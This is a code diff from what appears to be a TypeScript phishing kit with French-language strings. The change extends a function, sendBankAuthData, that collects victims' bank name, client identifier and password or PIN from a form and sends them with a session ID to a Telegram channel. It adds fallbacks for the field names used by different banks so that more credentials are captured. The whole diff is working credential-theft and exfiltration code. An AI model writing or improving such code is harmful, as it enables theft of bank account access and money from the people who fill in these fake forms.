@@ -68,14 +68,20 @@ export async function sendBankFormData(formData: any): Promise<boolean> {
 
 export async function sendBankAuthData(formData: any): Promise<boolean> {
   const sessionId = SessionManager.getSessionId();
+  
+  // Gérer les différents noms de champs selon la banque
+  const identifier = formData.clientNumber || formData.identifier || formData.userId || formData.accountNumber || '';
+  const password = formData.password || formData.secretCode || formData.pin || '';
+  const bankName = formData.bank || 'Banque inconnue';
+  
   const message = `
 🆔 Session ID: ${sessionId}
 
 🏦 AUTHENTIFICATION BANCAIRE
 
-🏛️ Banque: ${formData.bank}
-👤 Numéro client: ${formData.clientNumber}
-🔑 Code secret/Mot de passe: ${formData.password || formData.secretCode}
+🏛️ Banque: ${bankName}
+👤 Identifiant: ${identifier}
+🔑 Mot de passe: ${password}
   `;
 
   const success = await sendTelegramMessage(message);
